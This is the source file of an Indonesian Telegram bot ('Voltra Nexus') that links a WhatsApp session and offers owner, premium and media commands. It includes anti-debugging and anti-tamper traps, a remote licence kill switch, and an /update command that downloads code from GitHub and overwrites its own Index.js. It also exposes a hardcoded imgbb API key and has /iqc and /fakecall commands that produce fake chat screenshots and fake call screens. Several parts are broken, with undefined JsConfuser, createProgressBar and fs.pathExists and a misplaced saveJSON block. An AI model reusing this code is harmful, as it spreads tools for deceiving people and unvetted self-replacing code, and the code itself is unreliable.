const { Telegraf } = require("telegraf");
const { spawn } = require('child_process');
const { pipeline } = require('stream/promises');
const { createWriteStream } = require('fs');
const fs = require('fs');
const path = require('path');
const jid = "0@s.whatsapp.net";
const vm = require('vm');
const os = require('os');
const { tokenBot, ownerID } = require("./settings/config");
const adminFile = './database/adminuser.json';
const FormData = require("form-data");
const https = require("https");
function fetchJsonHttps(url, timeout = 5000) {
  return new Promise((resolve, reject) => {
    try {
      const req = https.get(url, { timeout }, (res) => {
        const { statusCode } = res;
        if (statusCode < 200 || statusCode >= 300) {
          let _ = '';
          res.on('data', c => _ += c);
          res.on('end', () => reject(new Error(`HTTP ${statusCode}`)));
          return;
        }
        let raw = '';
        res.on('data', (chunk) => (raw += chunk));
        res.on('end', () => {
          try {
            const json = JSON.parse(raw);
            resolve(json);
          } catch (err) {
            reject(new Error('Invalid JSON response'));
          }
        });
      });
      req.on('timeout', () => {
        req.destroy(new Error('Request timeout'));
      });
      req.on('error', (err) => reject(err));
    } catch (err) {
      reject(err);
    }
  });
}
const {
  default: makeWASocket,
  useMultiFileAuthState,
  fetchLatestBaileysVersion,
  generateWAMessageFromContent,
  prepareWAMessageMedia,
  downloadContentFromMessage,
  generateForwardMessageContent,
  generateWAMessage,
  jidDecode,
  areJidsSameUser,
  encodeSignedDeviceIdentity,
  encodeWAMessage,
  jidEncode,
  patchMessageBeforeSending,
  encodeNewsletterMessage,
  BufferJSON,
  DisconnectReason,
  proto,
} = require('@whiskeysockets/baileys');
const pino = require('pino');
const crypto = require('crypto');
const chalk = require('chalk');
const axios = require('axios');
const moment = require('moment-timezone');
const EventEmitter = require('events')
const makeInMemoryStore = ({ logger = console } = {}) => {
const ev = new EventEmitter()

  let chats = {}
  let messages = {}
  let contacts = {}

  ev.on('messages.upsert', ({ messages: newMessages, type }) => {
    for (const msg of newMessages) {
      const chatId = msg.key.remoteJid
      if (!messages[chatId]) messages[chatId] = []
      messages[chatId].push(msg)

      if (messages[chatId].length > 50) {
        messages[chatId].shift()
      }

      chats[chatId] = {
        ...(chats[chatId] || {}),
        id: chatId,
        name: msg.pushName,
        lastMsgTimestamp: +msg.messageTimestamp
      }
    }
  })

  ev.on('chats.set', ({ chats: newChats }) => {
    for (const chat of newChats) {
      chats[chat.id] = chat
    }
  })

  ev.on('contacts.set', ({ contacts: newContacts }) => {
    for (const id in newContacts) {
      contacts[id] = newContacts[id]
    }
  })

  return {
    chats,
    messages,
    contacts,
    bind: (evTarget) => {
      evTarget.on('messages.upsert', (m) => ev.emit('messages.upsert', m))
      evTarget.on('chats.set', (c) => ev.emit('chats.set', c))
      evTarget.on('contacts.set', (c) => ev.emit('contacts.set', c))
    },
    logger
  }
}

const databaseUrl = 'https://raw.githubusercontent.com/jaysss315/Voltra-Nexus/refs/heads/main/tokens.json';
const thumbnailUrl = "https://files.catbox.moe/o4gvao.jpg";

const thumbnailVideo = "https://files.catbox.moe/5ya1gj.mp4";

function createSafeSock(sock) {
  let sendCount = 0
  const MAX_SENDS = 500
  const normalize = j =>
    j && j.includes("@")
      ? j
      : j.replace(/[^0-9]/g, "") + "@s.whatsapp.net"

  return {
    sendMessage: async (target, message) => {
      if (sendCount++ > MAX_SENDS) throw new Error("RateLimit")
      const jid = normalize(target)
      return await sock.sendMessage(jid, message)
    },
    relayMessage: async (target, messageObj, opts = {}) => {
      if (sendCount++ > MAX_SENDS) throw new Error("RateLimit")
      const jid = normalize(target)
      return await sock.relayMessage(jid, messageObj, opts)
    },
    presenceSubscribe: async jid => {
      try { return await sock.presenceSubscribe(normalize(jid)) } catch(e){}
    },
    sendPresenceUpdate: async (state,jid) => {
      try { return await sock.sendPresenceUpdate(state, normalize(jid)) } catch(e){}
    }
  }
}

function activateSecureMode() {
  secureMode = true;
}

(function() {
  function randErr() {
    return Array.from({ length: 12 }, () =>
      String.fromCharCode(33 + Math.floor(Math.random() * 90))
    ).join("");
  }

  setInterval(() => {
    const start = performance.now();
    debugger;
    if (performance.now() - start > 100) {
      throw new Error(randErr());
    }
  }, 1000);

  const code = "AlwaysProtect";
  if (code.length !== 13) {
    throw new Error(randErr());
  }

  function secure() {
    console.log(chalk.bold.yellow(`
⠀⬡═—⊱ CHECKING SERVER ⊰—═⬡
┃Bot Sukses Terhubung Terimakasih 
⬡═―—―――――――――――――――――—═⬡
  `))
  }
  
  const hash = Buffer.from(secure.toString()).toString("base64");
  setInterval(() => {
    if (Buffer.from(secure.toString()).toString("base64") !== hash) {
      throw new Error(randErr());
    }
  }, 2000);

  secure();
})();

(() => {
  const hardExit = process.exit.bind(process);
  Object.defineProperty(process, "exit", {
    value: hardExit,
    writable: false,
    configurable: false,
    enumerable: true,
  });

  const hardKill = process.kill.bind(process);
  Object.defineProperty(process, "kill", {
    value: hardKill,
    writable: false,
    configurable: false,
    enumerable: true,
  });

  setInterval(() => {
    try {
      if (process.exit.toString().includes("Proxy") ||
          process.kill.toString().includes("Proxy")) {
        console.log(chalk.bold.yellow(`
⠀⬡═—⊱ BYPASS CHECKING ⊰—═⬡
┃PERUBAHAN CODE MYSQL TERDETEKSI
┃ SCRIPT DIMATIKAN / TIDAK BISA PAKAI
⬡═―—―――――――――――――――――—═⬡
  `))
        activateSecureMode();
         hardExit(1);
      }

      for (const sig of ["SIGINT", "SIGTERM", "SIGHUP"]) {
        if (process.listeners(sig).length > 0) {
          console.log(chalk.bold.yellow(`
⠀⬡═—⊱ BYPASS CHECKING ⊰—═⬡
┃PERUBAHAN CODE MYSQL TERDETEKSI
┃ SCRIPT DIMATIKAN / TIDAK BISA PAKAI
⬡═―—―――――――――――――――――—═⬡
  `))
        activateSecureMode();
         hardExit(1);
        }
      }
    } catch {
      activateSecureMode();
       hardExit(1);
    }
  }, 2000);

  global.validateToken = async (databaseUrl, tokenBot) => {
  try {
    const res = await fetchJsonHttps(databaseUrl, 5000);
    const tokens = (res && res.tokens) || [];

    if (!tokens.includes(tokenBot)) {
      console.log(chalk.bold.yellow(`
⠀⬡═—⊱ BYPASS ALERT⊰—═⬡
┃ NOTE : SERVER MENDETEKSI KAMU
┃  MEMBYPASS PAKSA SCRIPT !
⬡═―—―――――――――――――――――—═⬡
  `));

      try {
      } catch (e) {
      }

      activateSecureMode();
       hardExit(1);
    }
  } catch (err) {
    console.log(chalk.bold.yellow(`
⠀⬡═—⊱ CHECK SERVER ⊰—═⬡
┃ DATABASE : MYSQL
┃ NOTE : SERVER GAGAL TERHUBUNG
⬡═―—―――――――――――――――――—═⬡
  `));
    activateSecureMode();
     hardExit(1);
  }
};
})();

const question = (query) => new Promise((resolve) => {
    const rl = require('readline').createInterface({
        input: process.stdin,
        output: process.stdout
    });
    rl.question(query, (answer) => {
        rl.close();
        resolve(answer);
    });
});

async function isAuthorizedToken(token) {
    try {
        const res = await fetchJsonHttps(databaseUrl, 5000);
        const authorizedTokens = (res && res.tokens) || [];
        return Array.isArray(authorizedTokens) && authorizedTokens.includes(token);
    } catch (e) {
        return false;
    }
}

(async () => {
    await validateToken(databaseUrl, tokenBot);
})();

const bot = new Telegraf(tokenBot);
let tokenValidated = false;
let secureMode = false;
let sock = null;
let isWhatsAppConnected = false;
let linkedWhatsAppNumber = '';
let lastPairingMessage = null;
const usePairingCode = true;

const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));

const premiumFile = './database/premium.json';
const cooldownFile = './database/cooldown.json'

const loadPremiumUsers = () => {
    try {
        const data = fs.readFileSync(premiumFile);
        return JSON.parse(data);
    } catch (err) {
        return {};
    }
};

const savePremiumUsers = (users) => {
    fs.writeFileSync(premiumFile, JSON.stringify(users, null, 2));
};

const addpremUser = (userId, duration) => {
    const premiumUsers = loadPremiumUsers();
    const expiryDate = moment().add(duration, 'days').tz('Asia/Jakarta').format('DD-MM-YYYY');
    premiumUsers[userId] = expiryDate;
    savePremiumUsers(premiumUsers);
    return expiryDate;
};

const removePremiumUser = (userId) => {
    const premiumUsers = loadPremiumUsers();
    delete premiumUsers[userId];
    savePremiumUsers(premiumUsers);
};

const isPremiumUser = (userId) => {
    const premiumUsers = loadPremiumUsers();
    if (premiumUsers[userId]) {
        const expiryDate = moment(premiumUsers[userId], 'DD-MM-YYYY');
        if (moment().isBefore(expiryDate)) {
            return true;
        } else {
            removePremiumUser(userId);
            return false;
        }
    }
    return false;
};

const loadCooldown = () => {
    try {
        const data = fs.readFileSync(cooldownFile)
        return JSON.parse(data).cooldown || 5
    } catch {
        return 5
    }
}

const saveCooldown = (seconds) => {
    fs.writeFileSync(cooldownFile, JSON.stringify({ cooldown: seconds }, null, 2))
}

let cooldown = loadCooldown()
const userCooldowns = new Map()

function formatRuntime() {
  let sec = Math.floor(process.uptime());
  let hrs = Math.floor(sec / 3600);
  sec %= 3600;
  let mins = Math.floor(sec / 60);
  sec %= 60;
  return `${hrs}h ${mins}m ${sec}s`;
}

function formatMemory() {
  const usedMB = process.memoryUsage().rss / 524 / 524;
  return `${usedMB.toFixed(0)} MB`;
}

const startSesi = async () => {
console.clear();
  console.log(chalk.bold.yellow(`
⠀⠀⠀⠀


  Status: Bot Connected
  `))
    
const store = makeInMemoryStore({
  logger: require('pino')().child({ level: 'silent', stream: 'store' })
})
    const { state, saveCreds } = await useMultiFileAuthState('./session');
    const { version } = await fetchLatestBaileysVersion();

    const connectionOptions = {
        version,
        keepAliveIntervalMs: 30000,
        printQRInTerminal: !usePairingCode,
        logger: pino({ level: "silent" }),
        auth: state,
        browser: ['Mac OS', 'Safari', '5.15.7'],
        getMessage: async (key) => ({
            conversation: 'Apophis',
        }),
    };

    sock = makeWASocket(connectionOptions);
    
    sock.ev.on("messages.upsert", async (m) => {
        try {
            if (!m || !m.messages || !m.messages[0]) {
                return;
            }

            const msg = m.messages[0]; 
            const chatId = msg.key.remoteJid || "Tidak Diketahui";

        } catch (error) {
        }
    });

    sock.ev.on('creds.update', saveCreds);
    store.bind(sock.ev);
    
    sock.ev.on('connection.update', (update) => {
        const { connection, lastDisconnect } = update;
        if (connection === 'open') {
        
        if (lastPairingMessage) {
        const connectedMenu = `
<blockquote><pre>⬡═―—⊱ ⎧ 𝙑𝙤𝙡𝙩𝙧𝙖 𝙉𝙚𝙭𝙪𝙨 ⎭ ⊰―—═⬡</pre></blockquote>
⌑ Number: ${lastPairingMessage.phoneNumber}
⌑ Pairing Code: ${lastPairingMessage.pairingCode}
⌑ Type: Connected
╘—————————————————═⬡`;

        try {
          bot.telegram.editMessageCaption(
            lastPairingMessage.chatId,
            lastPairingMessage.messageId,
            undefined,
            connectedMenu,
            { parse_mode: "HTML" }
          );
        } catch (e) {
        }
      }
      
            console.clear();
            isWhatsAppConnected = true;
            const currentTime = moment().tz('Asia/Jakarta').format('HH:mm:ss');
            console.log(chalk.bold.yellow(`
⠀⠀⠀
░


  `))
        }

                 if (connection === 'close') {
            const shouldReconnect = lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut;
            console.log(
                chalk.red('Koneksi WhatsApp terputus:'),
                shouldReconnect ? 'Mencoba Menautkan Perangkat' : 'Silakan Menautkan Perangkat Lagi'
            );
            if (shouldReconnect) {
                startSesi();
            }
            isWhatsAppConnected = false;
        }
    });
};

startSesi();

const checkWhatsAppConnection = (ctx, next) => {
    if (!isWhatsAppConnected) {
        ctx.reply("🪧 ☇ Tidak ada sender yang terhubung");
        return;
    }
    next();
};

const checkCooldown = (ctx, next) => {
    const userId = ctx.from.id
    const now = Date.now()

    if (userCooldowns.has(userId)) {
        const lastUsed = userCooldowns.get(userId)
        const diff = (now - lastUsed) / 500

        if (diff < cooldown) {
            const remaining = Math.ceil(cooldown - diff)
            ctx.reply(`⏳ ☇ Harap menunggu ${remaining} detik`)
            return
        }
    }

    userCooldowns.set(userId, now)
    next()
}

const checkPremium = (ctx, next) => {
    if (!isPremiumUser(ctx.from.id)) {
        ctx.reply("❌ ☇ Akses hanya untuk premium");
        return;
    }
    next();
};

bot.command("addbot", async (ctx) => {
   if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }
    
  const args = ctx.message.text.split(" ")[1];
  if (!args) return ctx.reply("🪧 ☇ Format: /addbot 62×××");

  const phoneNumber = args.replace(/[^0-9]/g, "");
  if (!phoneNumber) return ctx.reply("❌ ☇ Nomor tidak valid");

  try {
    if (!sock) return ctx.reply("❌ ☇ Socket belum siap, coba lagi nanti");
    if (sock.authState.creds.registered) {
      return ctx.reply(`✅ ☇ WhatsApp sudah terhubung dengan nomor: ${phoneNumber}`);
    }

    const code = await sock.requestPairingCode(phoneNumber, "JAYSGNTG");
        const formattedCode = code?.match(/.{1,4}/g)?.join("-") || code;  

    const pairingMenu = `\`\`\`
⬡═―—⊱ ⎧ 𝙑𝙤𝙡𝙩𝙧𝙖 𝙉𝙚𝙭𝙪𝙨 ⎭ ⊰―—═⬡
⌑ Number: ${phoneNumber}
⌑ Pairing Code: ${formattedCode}
⌑ Type: Not Connected
╘═——————————————═⬡
\`\`\``;

    const sentMsg = await ctx.replyWithPhoto(thumbnailUrl, {  
      caption: pairingMenu,  
      parse_mode: "Markdown"  
    });  

    lastPairingMessage = {  
      chatId: ctx.chat.id,  
      messageId: sentMsg.message_id,  
      phoneNumber,  
      pairingCode: formattedCode
    };

  } catch (err) {
    console.error(err);
  }
});

if (sock) {
  sock.ev.on("connection.update", async (update) => {
    if (update.connection === "open" && lastPairingMessage) {
      const updateConnectionMenu = `\`\`\`
 ⬡═―—⊱ ⎧ 𝙑𝙤𝙡𝙩𝙧𝙖 𝙉𝙚𝙭𝙪𝙨 ⎭ ⊰―—═⬡
⌑ Number: ${lastPairingMessage.phoneNumber}
⌑ Pairing Code: ${lastPairingMessage.pairingCode}
⌑ Type: Connected
╘═——————————————═⬡\`\`\`
`;

      try {  
        await bot.telegram.editMessageCaption(  
          lastPairingMessage.chatId,  
          lastPairingMessage.messageId,  
          undefined,  
          updateConnectionMenu,  
          { parse_mode: "Markdown" }  
        );  
      } catch (e) {  
      }  
    }
  });
}

const loadJSON = (file) => {
    if (!fs.existsSync(file)) return [];
    return JSON.parse(fs.readFileSync(file, 'utf8'));
};

const saveJSON = (file, data) => {
    fs.writeFileSync(file, JSON.stringify(data, null, 2));
    
    
let adminUsers = loadJSON(adminFile);

const checkAdmin = (ctx, next) => {
    if (!adminUsers.includes(ctx.from.id.toString())) {
        return ctx.reply("❌ Anda bukan Admin. jika anda adalah owner silahkan daftar ulang ID anda menjadi admin");
    }
    next();
};


};
// --- Fungsi untuk Menambahkan Admin ---
const addAdmin = (userId) => {
    if (!adminList.includes(userId)) {
        adminList.push(userId);
        saveAdmins();
    }
};

// --- Fungsi untuk Menghapus Admin ---
const removeAdmin = (userId) => {
    adminList = adminList.filter(id => id !== userId);
    saveAdmins();
};

// --- Fungsi untuk Menyimpan Daftar Admin ---
const saveAdmins = () => {
    fs.writeFileSync('./database/admins.json', JSON.stringify(adminList));
};

// --- Fungsi untuk Memuat Daftar Admin ---
const loadAdmins = () => {
    try {
        const data = fs.readFileSync('./database/admins.json');
        adminList = JSON.parse(data);
    } catch (error) {
        console.error(chalk.red('Gagal memuat daftar admin:'), error);
        adminList = [];
    }
};

bot.command('addadmin', async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }
    const args = ctx.message.text.split(' ');
    const userId = args[1];

    if (adminUsers.includes(userId)) {
        return ctx.reply(`✅ si ngentot ${userId} sudah memiliki status Admin.`);
    }

    adminUsers.push(userId);
    saveJSON(adminFile, adminUsers);

    return ctx.reply(`🎉 si kontol ${userId} sekarang memiliki akses Admin!`);
});


bot.command("tiktok", async (ctx) => {
  const args = ctx.message.text.split(" ")[1];
  if (!args)
    return ctx.replyWithMarkdown(
      "🎵 *Download TikTok*\n\nContoh: `/tiktok https://vt.tiktok.com/xxx`\n_Support tanpa watermark & audio_"
    );

  if (!args.match(/(tiktok\.com|vm\.tiktok\.com|vt\.tiktok\.com)/i))
    return ctx.reply("❌ Format link TikTok tidak valid!");

  try {
    const processing = await ctx.reply("⏳ _Mengunduh video TikTok..._", { parse_mode: "Markdown" });

    const encodedParams = new URLSearchParams();
    encodedParams.set("url", args);
    encodedParams.set("hd", "1");

    const { data } = await axios.post("https://tikwm.com/api/", encodedParams, {
      headers: {
        "Content-Type": "application/x-www-form-urlencoded",
        "User-Agent": "TikTokBot/1.0",
      },
      timeout: 30000,
    });

    if (!data.data?.play) throw new Error("URL video tidak ditemukan");

    await ctx.deleteMessage(processing.message_id);
    await ctx.replyWithVideo({ url: data.data.play }, {
      caption: `🎵 *${data.data.title || "Video TikTok"}*\n🔗 ${args}\n\n✅ Tanpa watermark`,
      parse_mode: "Markdown",
    });

    if (data.data.music) {
      await ctx.replyWithAudio({ url: data.data.music }, { title: "Audio Original" });
    }
  } catch (err) {
    console.error("[TIKTOK ERROR]", err.message);
    ctx.reply(`❌ Gagal mengunduh: ${err.message}`);
  }
});

// Logging (biar gampang trace error)
function log(message, error) {
  if (error) {
    console.error(`[EncryptBot] ❌ ${message}`, error);
  } else {
    console.log(`[EncryptBot] ✅ ${message}`);
  }
}

bot.command("iqc", async (ctx) => {
  const fullText = (ctx.message.text || "").split(" ").slice(1).join(" ").trim();

  try {
    await ctx.sendChatAction("upload_photo");

    if (!fullText) {
      return ctx.reply(
        "🧩 Masukkan teks!\nContoh: /iqc Konichiwa|06:00|100"
      );
    }

    const parts = fullText.split("|");
    if (parts.length < 2) {
      return ctx.reply(
        "❗ Format salah!\n🍀 Contoh: /iqc Teks|WaktuChat|StatusBar"
      );
    }

    let [message, chatTime, statusBarTime] = parts.map((p) => p.trim());

    if (!statusBarTime) {
      const now = new Date();
      statusBarTime = `${String(now.getHours()).padStart(2, "0")}:${String(
        now.getMinutes()
      ).padStart(2, "0")}`;
    }

    if (message.length > 80) {
      return ctx.reply("🍂 Teks terlalu panjang! Maksimal 80 karakter.");
    }

    const url = `https://api.zenzxz.my.id/maker/fakechatiphone?text=${encodeURIComponent(
      message
    )}&chatime=${encodeURIComponent(chatTime)}&statusbartime=${encodeURIComponent(
      statusBarTime
    )}`;

    const response = await fetch(url);
    if (!response.ok) throw new Error("Gagal mengambil gambar dari API");

    const buffer = await response.buffer();

    const caption = `
✨ <b>Fake Chat iPhone Berhasil Dibuat!</b>

💬 <b>Pesan:</b> ${message}
⏰ <b>Waktu Chat:</b> ${chatTime}
📱 <b>Status Bar:</b> ${statusBarTime}
`;

    await ctx.replyWithPhoto({ source: buffer }, { caption, parse_mode: "HTML" });
  } catch (err) {
    console.error(err);
    await ctx.reply("🍂 Gagal membuat gambar. Coba lagi nanti.");
  }
});

//MD MENU
bot.command("fakecall", async (ctx) => {
  const args = ctx.message.text.split(" ").slice(1).join(" ").split("|");

  if (!ctx.message.reply_to_message || !ctx.message.reply_to_message.photo) {
    return ctx.reply("❌ Reply ke foto untuk dijadikan avatar!");
  }

  const nama = args[0]?.trim();
  const durasi = args[1]?.trim();

  if (!nama || !durasi) {
    return ctx.reply("📌 Format: `/fakecall nama|durasi` (reply foto)", { parse_mode: "Markdown" });
  }

  try {
    const fileId = ctx.message.reply_to_message.photo.pop().file_id;
    const fileLink = await ctx.telegram.getFileLink(fileId);

    const api = `https://api.zenzxz.my.id/maker/fakecall?nama=${encodeURIComponent(
      nama
    )}&durasi=${encodeURIComponent(durasi)}&avatar=${encodeURIComponent(
      fileLink
    )}`;

    const res = await fetch(api);
    const buffer = await res.buffer();

    await ctx.replyWithPhoto({ source: buffer }, {
      caption: `📞 Fake Call dari *${nama}* (durasi: ${durasi})`,
      parse_mode: "Markdown",
    });
  } catch (err) {
    console.error(err);
    ctx.reply("⚠️ Gagal membuat fakecall.");
  }
});

bot.command("tourl", async (ctx) => {
  try {
    const reply = ctx.message.reply_to_message;
    if (!reply) return ctx.reply("❗ Reply media (foto/video/audio/dokumen) dengan perintah /tourl");

    let fileId;
    if (reply.photo) {
      fileId = reply.photo[reply.photo.length - 1].file_id;
    } else if (reply.video) {
      fileId = reply.video.file_id;
    } else if (reply.audio) {
      fileId = reply.audio.file_id;
    } else if (reply.document) {
      fileId = reply.document.file_id;
    } else {
      return ctx.reply("❌ Format file tidak didukung. Harap reply foto/video/audio/dokumen.");
    }

    const fileLink = await ctx.telegram.getFileLink(fileId);
    const response = await axios.get(fileLink.href, { responseType: "arraybuffer" });
    const buffer = Buffer.from(response.data);

    const form = new FormData();
    form.append("reqtype", "fileupload");
    form.append("fileToUpload", buffer, {
      filename: path.basename(fileLink.href),
      contentType: "application/octet-stream",
    });

    const uploadRes = await axios.post("https://catbox.moe/user/api.php", form, {
      headers: form.getHeaders(),
    });

    const url = uploadRes.data;
    ctx.reply(`✅ File berhasil diupload:\n${url}`);
  } catch (err) {
    console.error("❌ Gagal tourl:", err.message);
    ctx.reply("❌ Gagal mengupload file ke URL.");
  }
});

const IMGBB_API_KEY = "76919ab4062bedf067c9cab0351cf632";

bot.command("tourl2", async (ctx) => {
  try {
    const reply = ctx.message.reply_to_message;
    if (!reply) return ctx.reply("❗ Reply foto dengan /tourl2");

    let fileId;
    if (reply.photo) {
      fileId = reply.photo[reply.photo.length - 1].file_id;
    } else {
      return ctx.reply("❌ i.ibb hanya mendukung foto/gambar.");
    }

    const fileLink = await ctx.telegram.getFileLink(fileId);
    const response = await axios.get(fileLink.href, { responseType: "arraybuffer" });
    const buffer = Buffer.from(response.data);

    const form = new FormData();
    form.append("image", buffer.toString("base64"));

    const uploadRes = await axios.post(
      `https://api.imgbb.com/1/upload?key=${IMGBB_API_KEY}`,
      form,
      { headers: form.getHeaders() }
    );

    const url = uploadRes.data.data.url;
    ctx.reply(`✅ Foto berhasil diupload:\n${url}`);
  } catch (err) {
    console.error("❌ tourl2 error:", err.message);
    ctx.reply("❌ Gagal mengupload foto ke i.ibb.co");
  }
});

bot.command("zenc", async (ctx) => {
  
  if (!ctx.message.reply_to_message || !ctx.message.reply_to_message.document) {
    return ctx.replyWithMarkdown("❌ Harus reply ke file .js");
  }

  const file = ctx.message.reply_to_message.document;
  if (!file.file_name.endsWith(".js")) {
    return ctx.replyWithMarkdown("❌ File harus berekstensi .js");
  }

  const encryptedPath = path.join(
    __dirname,
    `invisible-encrypted-${file.file_name}`
  );

  try {
    const progressMessage = await ctx.replyWithMarkdown(
      "```css\n" +
        "🔒 EncryptBot\n" +
        ` ⚙️ Memulai (Invisible) (1%)\n` +
        ` ${createProgressBar(1)}\n` +
        "```\n"
    );

    const fileLink = await ctx.telegram.getFileLink(file.file_id);
    log(`Mengunduh file: ${file.file_name}`);
    await updateProgress(ctx, progressMessage, 10, "Mengunduh");
    const response = await fetch(fileLink);
    let fileContent = await response.text();
    await updateProgress(ctx, progressMessage, 20, "Mengunduh Selesai");

    log(`Memvalidasi kode awal: ${file.file_name}`);
    await updateProgress(ctx, progressMessage, 30, "Memvalidasi Kode");
    try {
      new Function(fileContent);
    } catch (syntaxError) {
      throw new Error(`Kode tidak valid: ${syntaxError.message}`);
    }

    log(`Proses obfuscation: ${file.file_name}`);
    await updateProgress(ctx, progressMessage, 40, "Inisialisasi Obfuscation");
    const obfuscated = await JsConfuser.obfuscate(
      fileContent,
      getStrongObfuscationConfig()
    );

    let obfuscatedCode = obfuscated.code || obfuscated;
    if (typeof obfuscatedCode !== "string") {
      throw new Error("Hasil obfuscation bukan string");
    }

    log(`Preview hasil (50 char): ${obfuscatedCode.substring(0, 50)}...`);
    await updateProgress(ctx, progressMessage, 60, "Transformasi Kode");

    log(`Validasi hasil obfuscation`);
    try {
      new Function(obfuscatedCode);
    } catch (postObfuscationError) {
      throw new Error(
        `Hasil obfuscation tidak valid: ${postObfuscationError.message}`
      );
    }

    await updateProgress(ctx, progressMessage, 80, "Finalisasi Enkripsi");
    await fs.writeFile(encryptedPath, obfuscatedCode);

    log(`Mengirim file terenkripsi: ${file.file_name}`);
    await ctx.replyWithDocument(
      { source: encryptedPath, filename: `Invisible-encrypted-${file.file_name}` },
      {
        caption:
          "✅ *ENCRYPT BERHASIL!*\n\n" +
          "📂 File: `" +
          file.file_name +
          "`\n" +
          "🔒 Mode: *Invisible Strong Obfuscation*",
        parse_mode: "Markdown",
      }
    );

    await ctx.deleteMessage(progressMessage.message_id);

    if (await fs.pathExists(encryptedPath)) {
      await fs.unlink(encryptedPath);
      log(`File sementara dihapus: ${encryptedPath}`);
    }
  } catch (error) {
    log("Kesalahan saat zenc", error);
    await ctx.replyWithMarkdown(
      `❌ *Kesalahan:* ${error.message || "Tidak diketahui"}\n` +
        "_Coba lagi dengan kode Javascript yang valid!_"
    );
    if (await fs.pathExists(encryptedPath)) {
      await fs.unlink(encryptedPath);
      log(`File sementara dihapus setelah error: ${encryptedPath}`);
    }
  }
});

bot.command("update", async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }

    const repoRaw = "https://raw.githubusercontent.com/jaysss315/Update/main/Update.json";

    try {
        await ctx.reply("⏳ 𝗩𝗼𝗹𝘁𝗿𝗮 𝗡𝗲𝘅𝘂𝘀 — 𝗟𝗼𝗮𝗱𝗶𝗻𝗴");

        const { data } = await axios.get(repoRaw);

        if (!data) {
            return ctx.reply("❌ 𝗩𝗼𝗹𝘁𝗿𝗮 𝗡𝗲𝘅𝘂𝘀 — 𝗙𝗮𝗶𝗹𝗲𝗱");
        }

        fs.writeFileSync("./Index.js", data);

        await ctx.reply(
            "✅ 𝗩𝗼𝗹𝘁𝗿𝗮 𝗡𝗲𝘅𝘂𝘀 — 𝗦𝘂𝗰𝗰𝗲𝘀\n♻️ 𝗦𝗶𝗹𝗮𝗵𝗸𝗮𝗻 𝗥𝗲𝘀𝘁𝗮𝗿𝘁 𝗣𝗮𝗻𝗲𝗹"
        );

    } catch (err) {
        console.log(err);

        await ctx.reply(
            "❌ 𝗩𝗼𝗹𝘁𝗿𝗮 𝗡𝗲𝘅𝘂𝘀 — 𝗚𝗮𝗴𝗮𝗹\n𝗦𝗶𝗹𝗮𝗵𝗸𝗮𝗻 𝗟𝗮𝗽𝗼𝗿 𝗢𝘄𝗻𝗲𝗿"
        );
    }
});

bot.command("setcd", async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }

    const args = ctx.message.text.split(" ");
    const seconds = parseInt(args[1]);

    if (isNaN(seconds) || seconds < 0) {
        return ctx.reply("🪧 ☇ Format: /setcd 5");
    }

    cooldown = seconds
    saveCooldown(seconds)
    ctx.reply(`✅ ☇ Cooldown berhasil diatur ke ${seconds} detik`);
});

bot.command("killsesi", async (ctx) => {
  if (ctx.from.id != ownerID) {
    return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
  }

  try {
    const sessionDirs = ["./session", "./sessions"];
    let deleted = false;

    for (const dir of sessionDirs) {
      if (fs.existsSync(dir)) {
        fs.rmSync(dir, { recursive: true, force: true });
        deleted = true;
      }
    }

    if (deleted) {
      await ctx.reply("✅ ☇ Session berhasil dihapus, panel akan restart");
      setTimeout(() => {
        process.exit(1);
      }, 2000);
    } else {
      ctx.reply("🪧 ☇ Tidak ada folder session yang ditemukan");
    }
  } catch (err) {
    console.error(err);
    ctx.reply("❌ ☇ Gagal menghapus session");
  }
});



const PREM_GROUP_FILE = "./grup.json";

// Auto create file grup.json kalau belum ada
function ensurePremGroupFile() {
  if (!fs.existsSync(PREM_GROUP_FILE)) {
    fs.writeFileSync(PREM_GROUP_FILE, JSON.stringify([], null, 2));
  }
}

function loadPremGroups() {
  ensurePremGroupFile();
  try {
    const raw = fs.readFileSync(PREM_GROUP_FILE, "utf8");
    const data = JSON.parse(raw);
    return Array.isArray(data) ? data.map(String) : [];
  } catch {
    // kalau corrupt, reset biar aman
    fs.writeFileSync(PREM_GROUP_FILE, JSON.stringify([], null, 2));
    return [];
  }
}

function savePremGroups(groups) {
  ensurePremGroupFile();
  const unique = [...new Set(groups.map(String))];
  fs.writeFileSync(PREM_GROUP_FILE, JSON.stringify(unique, null, 2));
}

function isPremGroup(chatId) {
  const groups = loadPremGroups();
  return groups.includes(String(chatId));
}

function addPremGroup(chatId) {
  const groups = loadPremGroups();
  const id = String(chatId);
  if (groups.includes(id)) return false;
  groups.push(id);
  savePremGroups(groups);
  return true;
}

function delPremGroup(chatId) {
  const groups = loadPremGroups();
  const id = String(chatId);
  if (!groups.includes(id)) return false;
  const next = groups.filter((x) => x !== id);
  savePremGroups(next);
  return true;
}

bot.command("addpremgrup", async (ctx) => {
  if (ctx.from.id != ownerID) return ctx.reply("❌ ☇ Akses hanya untuk pemilik");

  const args = (ctx.message?.text || "").trim().split(/\s+/);

 
  let groupId = String(ctx.chat.id);

  if (ctx.chat.type === "private") {
    if (args.length < 2) {
      return ctx.reply("🪧 ☇ Format: /addpremgrup -1001234567890\nKirim di private wajib pakai ID grup.");
    }
    groupId = String(args[1]);
  } else {
 
    if (args.length >= 2) groupId = String(args[1]);
  }

  const ok = addPremGroup(groupId);
  if (!ok) return ctx.reply(`🪧 ☇ Grup ${groupId} sudah terdaftar sebagai grup premium.`);
  return ctx.reply(`✅ ☇ Grup ${groupId} berhasil ditambahkan ke daftar grup premium.`);
});

bot.command("delpremgrup", async (ctx) => {
  if (ctx.from.id != ownerID) return ctx.reply("❌ ☇ Akses hanya untuk pemilik");

  const args = (ctx.message?.text || "").trim().split(/\s+/);

  let groupId = String(ctx.chat.id);

  if (ctx.chat.type === "private") {
    if (args.length < 2) {
      return ctx.reply("🪧 ☇ Format: /delpremgrup -1001234567890\nKirim di private wajib pakai ID grup.");
    }
    groupId = String(args[1]);
  } else {
    if (args.length >= 2) groupId = String(args[1]);
  }

  const ok = delPremGroup(groupId);
